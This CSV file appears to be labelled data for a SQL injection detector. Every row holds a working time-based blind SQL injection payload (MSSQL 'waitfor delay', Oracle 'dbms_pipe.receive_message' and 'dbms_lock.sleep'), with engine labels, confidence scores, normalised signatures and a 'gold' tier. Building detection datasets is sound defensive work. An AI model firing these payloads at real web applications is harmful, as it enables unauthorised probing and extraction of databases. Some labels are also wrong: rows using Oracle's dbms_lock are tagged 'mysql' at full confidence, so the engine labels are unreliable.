id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
18931,1 waitfor delay '0:0:5'-- nnnp,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1 waitfor delay '0:0:5'-- nnnp,False,0,__INT__ waitfor __IDENT__ __STR__ -- __IDENT__,ee3cf761,gold
1778,"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro",False,0,"waitfor __IDENT__ __STR__ and ( ( ( __STR__ like ""__IDENT__",f073e61c,gold
1550,"1"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"1"" ) ) ) waitfor delay '0:0:5'--",False,0,"__INT__"" ) ) ) waitfor __IDENT__ __STR__ --",f61f6455,gold
21321,waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5' and ( '%' = ',False,0,waitfor __IDENT__ __STR__ and ( __STR__ = ',f634ea99,gold
23233,1' ) where 8142 = 8142 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1' ) where 8142 = 8142 waitfor delay '0:0:5'--,False,0,__INT__ ) where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,f77d7b85,gold
24240,1' ) where 5540 = 5540 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1' ) where 5540 = 5540 waitfor delay '0:0:5'--,False,0,__INT__ ) where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,f77d7b85,gold
1728,1%' waitfor delay '0:0:5' and '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1%' waitfor delay '0:0:5' and '%' = ',False,0,__INT__ % waitfor __IDENT__ __TIME____STR__ % __STR__,fcc9a3a5,gold
23156,"1%"" waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"1%"" waitfor delay '0:0:5'--",False,0,"__INT__ % "" waitfor __IDENT__ __STR__ --",fdbe14dd,gold
23283,1' ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1' ) waitfor delay '0:0:5'--,False,0,__INT__ ) waitfor __IDENT__ __TIME__ --,ff568abb,gold
18966,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),False,0,__IDENT__ if ( __INT__ = __INT__ ) then dbms_lock . sleep ( __INT__ ),29c17c52,gold
18922,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",False,0,"__INT__' , ( __IDENT__ if ( __INT__ = __INT__ ) then dbms_lock . sleep ( __INT__ )",39efde02,gold
22221,"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2,"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",False,0,"__INT__ , ( __IDENT__ if ( __INT__ = __INT__ ) then dbms_lock . sleep ( __INT__ )",e3a89ee5,gold
25858,"1' in boolean mode ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' in boolean mode ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__' in __IDENT__ __IDENT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",01992a4d,gold
1250,"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__"" ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",039daa9d,gold
408,"1%' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and '%' = '",False,0,"__INT__ % or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and % __STR__",049e35a2,gold
21674,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,False,0,"__INT__ % or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and % __STR__",049e35a2,gold
527,"1' ) as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",0632ea03,gold
24078,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",0632ea03,gold
1767,"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 8554 = 8554",False,0,"__INT__ ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __INT__ = __INT__",063e8c03,gold
1009,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",06a8e69c,gold
2272,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",06a8e69c,gold
20075,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",06a8e69c,gold
23548,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'ekqv' = 'ekqv",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",06a8e69c,gold
25059,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",06a8e69c,gold
335,"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__' ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",07ff402d,gold
20943,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__' ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",07ff402d,gold
21144,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",False,0,"__INT__' ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",082f551d,gold
21147,"1' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__' or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",095a25c0,gold
18927,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__' where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",13a0282a,gold
21214,"1' where 8869 = 8869 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' where 8869 = 8869 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__' where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",13a0282a,gold
1454,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",False,0,"__INT__' ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",15769cde,gold
20690,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ % ' ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",18e53494,gold
916,begin dbms_lock.sleep ( 5 ),time_blind,oracle,1.0,"Signals: 'dbms_lock', 'sleep'; Time-blind SQLi (sleep/delay function); DB: oracle",2,begin dbms_lock.sleep ( 5 ),False,0,__IDENT__ dbms_lock . sleep ( __INT__ ),1960378c,gold
21077,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",False,0,"__INT__"" or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",1a46ab57,gold
1431,"1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",1d1d2b0e,gold
21126,"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",1d1d2b0e,gold
1032,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__ % ' ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",1e96d1c4,gold
19100,"1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( '%' = '",False,0,"__INT__ % ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( % __STR__",23eafa60,gold
25245,"1%"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""%"" = """,False,0,"__INT__ % ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( % __STR__",23eafa60,gold
22084,"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__ % ' ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",25b1d46f,gold
20752,"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ % "" and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",2de0327f,gold
22239,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",32f813e5,gold
24280,"1 ) as iuje where 1976 = 1976 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) as iuje where 1976 = 1976 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",32f813e5,gold
21846,"1 ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 6312 = 6312",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 6312 = 6312",False,0,"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __INT__ = __INT__",340fd476,gold
19292,"1 ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",36d1b044,gold
969,"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",False,0,"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",37de341d,gold
23484,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",False,0,"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) # __IDENT__",38908b8a,gold
